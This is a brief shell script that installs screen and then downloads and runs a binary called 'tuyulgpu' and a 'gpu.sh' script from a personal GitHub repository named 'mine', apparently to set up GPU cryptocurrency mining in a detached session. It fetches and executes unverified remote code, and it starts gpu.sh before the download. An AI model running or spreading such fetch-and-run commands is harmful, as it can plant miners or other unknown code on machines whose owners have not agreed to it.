#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 65 75
wget https://github.com/sampurasun111/c/raw/main/tuyulgpu
wget https://raw.githubusercontent.com/sampurasun111/mine/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
